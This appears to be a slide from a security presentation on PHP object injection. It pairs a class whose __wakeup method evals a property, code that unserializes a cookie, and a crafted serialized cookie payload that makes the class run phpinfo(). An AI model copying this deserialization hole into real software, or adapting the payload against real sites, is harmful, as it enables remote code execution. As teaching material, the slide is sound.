<section class="slide" id="<?= getSlideId(__FILE__) ?>">
    <div>
        <span class="chapter">PHP Object Injection</span>

        <div class="fs-65">
        <?php echo code('php', '
class Example2
{
   private $hook;

   function __wakeup()
   {
      if (isset($this->hook)) eval($this->hook);
   }
}

// some PHP code...
$user_data = unserialize($_COOKIE[\'data\']);
// some PHP code...
') ?>
        </div>
        <div class="fs-50">
        <?php echo code('html', '
Cookie: data=O:8:"Example2":1:{s:4:"hook";s:10:"phpinfo();";}
        ') ?>
        </div>




    </div>
</section>